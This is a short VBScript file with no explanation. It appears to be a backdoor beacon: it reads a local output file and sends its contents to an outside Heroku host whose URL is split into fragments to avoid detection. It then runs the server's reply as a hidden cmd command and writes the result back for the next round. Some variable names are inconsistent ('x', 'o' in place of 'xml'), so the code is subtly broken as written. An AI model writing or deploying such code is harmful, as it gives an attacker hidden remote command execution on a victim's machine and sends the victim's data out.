On Error Resume Next
Set fso  = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile("C:\output.txt", 1)
text = file.ReadAll
file.Close
Set xml = CreateObject("MSXML2.XMLHTTP")
x.open "GET", "htt" & "p:/" & "/bcts" & "lab2" & ".he" & "ro" & "ku.c" & "om/x?x="&text, True
xml.send
set sh = CreateObject("Wscript.Shell")
sh.Run("cmd /c " & o.responseText & " > C:\output.txt", 0, true)
